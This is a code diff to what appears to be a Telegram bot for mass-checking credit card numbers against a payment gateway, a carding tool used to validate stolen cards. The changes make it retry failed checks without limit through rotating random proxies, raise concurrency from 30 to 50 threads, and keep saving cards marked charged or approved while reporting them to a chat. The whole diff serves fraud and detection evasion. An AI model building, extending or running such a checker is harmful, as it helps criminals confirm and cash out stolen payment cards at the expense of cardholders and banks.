@@ -296,7 +296,7 @@ def build_block(cc_line, status, response, brand, bank, country, flag):
 {BRAND_ICON} {brand}
 {BANK_ICON} {bank}
 {COUNTRY_ICON} {country} {flag}
-{DEV_ICON} Haste
+{DEV_ICON} Haste🎱𖭠
 ────────────────────────────────────────"""
 
 def save_result(block, status):
@@ -338,24 +338,31 @@ def clean_declined_files():
 
 def worker(cc_line, use_proxy=False, proxy_type="http", chat_id=None):
     attempt = 0
-    while attempt < 3:
+    while True:
         attempt += 1
         proxy = None
         if use_proxy and proxies_list:
             with proxy_lock:
                 proxy = random.choice(proxies_list)
         status, response, brand_auto = check_cc(cc_line, proxy, proxy_type)
+        
         if status in ["CHARGED", "APPROVED", "DECLINED"]:
             break
-        time.sleep(random.uniform(0.8, 2.0))
+        
+        # Unlimited retry on ERROR with new proxy
+        time.sleep(random.uniform(0.5, 1.5))
+    
     bin_code = cc_line[:6]
     brand_bin, bank, country, flag = get_bin_info(bin_code)
     brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
+    
     if status == "CHARGED": stats["charged"] += 1
     elif status == "APPROVED": stats["approved"] += 1
     elif status == "ERROR": stats["error"] += 1
     else: stats["declined"] += 1
+    
     block = build_block(cc_line, status, response, brand, bank, country, flag)
+    
     if chat_id:
         try:
             bot.send_message(chat_id, f"`{cc_line}` → **{status}** {STATUS_EMOJI.get(status, '')} (Try {attempt})\n{response}", parse_mode='Markdown')
@@ -363,6 +370,7 @@ def worker(cc_line, use_proxy=False, proxy_type="http", chat_id=None):
                 bot.send_message(chat_id, f"```{block}```", parse_mode='Markdown')
         except:
             pass
+    
     if status in ["CHARGED", "APPROVED"]:
         save_result(block, status)
         save_approved_list(cc_line)
@@ -450,9 +458,9 @@ def mass_proxy_paste(msg, ccs, p_type_idx):
 
 def start_mass_check(ccs, use_proxy, proxy_type, chat_id):
     stats.update({"charged":0,"approved":0,"declined":0,"error":0})
-    bot.send_message(chat_id, f"🔄 Nagsugod sa {len(ccs)} ka cards... **VERY VERY FAST MODE**")
+    bot.send_message(chat_id, f"🔄 Nagsugod sa {len(ccs)} ka cards... **VERY VERY FAST MODE (50 Threads)**")
     worker_args = partial(worker, use_proxy=use_proxy, proxy_type=proxy_type, chat_id=chat_id)
-    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
         ex.map(worker_args, ccs)
     clean_declined_files()
     bot.send_message(chat_id, f"""✅ **Human na ang Check!**
